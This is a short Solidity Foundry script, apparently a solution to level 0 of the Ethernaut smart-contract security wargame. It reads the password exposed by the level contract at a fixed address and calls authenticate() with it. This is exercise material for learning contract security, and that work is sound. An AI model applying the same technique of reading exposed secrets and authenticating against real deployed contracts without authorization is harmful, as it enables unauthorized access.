//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/ethernaut0.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    Instance level0 = Instance(0x8464135c8F25Da09e49BC8782676a84730C318bC);

    function test() external {
        vm.startBroadcast();

        level0.password(); // query password to verify
        level0.authenticate(level0.password()); //call authenticate function with the password

        vm.stopBroadcast();
    }
}
